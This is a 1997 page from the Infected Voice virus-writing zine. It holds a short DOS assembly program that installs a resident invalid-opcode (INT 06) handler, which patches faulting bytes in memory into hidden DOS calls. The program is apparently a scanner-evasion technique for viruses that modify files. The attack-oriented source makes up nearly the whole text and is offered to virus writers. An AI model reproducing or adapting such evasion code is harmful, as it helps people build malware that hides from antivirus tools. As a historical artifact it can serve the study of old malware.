
      ÜÜ                  Û
     ßßß  Virus Magazine  Û Box 176, Kiev 210, Ukraine      IV  1997
     ßÛÛ ßßßßßßßßßßßßßßßß Û ßßßßßßßßßßßßßßßßßßß ß ßßßßŞßßß  ÛßßßßßßÛ
      ŞÛ ÛßÜ Ûßß Üßß Üßß ÜÛÜ Üßß ÛßÛ    İ Û ÜßÛ Û Üßß ÛÜÜ   Û ßßßÛ Û
       Û Û Û Ûß  Ûß  Û    Û  Ûß  Û Û    Û Û Û Û Û Û   Û     Û ÜÜÜÛ Û
       Û Ş Ş Ş   ŞÜÜ ŞÜÜ  Ş  ŞÜÜ ŞÜß     ßÛ ßÜÛ Ş ŞÜÜ ŞÜÜÜ  Û ÛÜÜÜ Û
       Ş ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ  ÛÜÜÜÜÜÜÛ
          (C) Copyright, 1994-97, by STEALTH group WorldWide, unLtd.
                              sgww@hotmail.com
            Digest of IV 8 - 11 russian, including Moscow issues

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ INT 06 handler for changed file                 ³(C) Stainless Steel Rat ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

		jumps
		.386p
cseg		segment para use16
		assume	cs:cseg,ds:cseg
		org	100h
start:
		mov ax,2506h
		mov dx,offset inter
		int 21h
		mov ax,3100h
		int 21h
inter:
		pop word ptr cs:[offset __ip]
		pop word ptr cs:[offset __cs]
		push word ptr cs:[offset __cs]
		push word ptr cs:[offset __ip]


		push es ax di bp
		mov ax,word ptr cs:[offset __cs]
		mov es,ax
		mov di,word ptr cs:[offset __ip]
		
		mov ax,word ptr es:[di+2]
		mov word ptr es:[di+1],ax
		mov byte ptr es:[di],0B8h
		mov word ptr es:[di+3],21CDh
		jmp exit

exit:
		pop bp di ax es
		iret

__ip		dw 0
__cs		dw 0



cseg		ends
                end  start